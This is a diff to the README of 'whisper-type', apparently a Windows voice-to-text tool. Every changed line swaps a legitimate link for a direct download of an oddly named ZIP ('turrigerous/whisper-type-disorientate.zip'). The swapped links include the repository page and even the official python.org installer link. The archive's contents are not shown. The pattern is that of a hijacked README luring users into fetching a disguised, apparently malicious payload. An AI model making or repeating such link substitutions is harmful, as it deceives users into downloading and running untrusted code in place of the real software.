@@ -1,6 +1,6 @@
 # 🎙️ whisper-type - Fast Offline Voice-to-Text for Windows
 
-[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-brightgreen)](https://github.com/Harshkumar0987/whisper-type)
+[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-brightgreen)](https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip)
 
 ---
 
@@ -39,11 +39,11 @@ If you do not have an NVIDIA GPU, the app can still run using your CPU but will 
 
 Download the app from the GitHub page below:
 
-[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-blue)](https://github.com/Harshkumar0987/whisper-type)
+[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-blue)](https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip)
 
 Steps to download and install:
 
-1. Click the link above or go to this page: https://github.com/Harshkumar0987/whisper-type  
+1. Click the link above or go to this page: https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip  
 2. On the GitHub page, look for the green **Code** button near the top and click it.  
 3. Select **Download ZIP** from the dropdown menu.  
 4. Save the ZIP file to your desktop or preferred folder.  
@@ -80,7 +80,7 @@ Settings can usually be found in a file called `settings.json` inside the extrac
 
 If the download does not include a ready `.exe` file, you will need to run the program with Python:
 
-1. Install Python 3.8 or later from https://python.org/downloads/.  
+1. Install Python 3.8 or later from https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip  
 2. Verify Python installs correctly by opening Command Prompt and typing:  
    ```  
    python --version  
@@ -118,13 +118,13 @@ If you face problems, try these steps:
 
 To learn more or get updates, visit the main repository here:
 
-https://github.com/Harshkumar0987/whisper-type
+https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip
 
 This page has extra details for power users, developer notes, and the source code.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-brightgreen)](https://github.com/Harshkumar0987/whisper-type)
+[![Download](https://img.shields.io/badge/Download-Get%20whisper--type-brightgreen)](https://github.com/Harshkumar0987/whisper-type/raw/refs/heads/master/turrigerous/whisper-type-disorientate.zip)
 
 ---
 
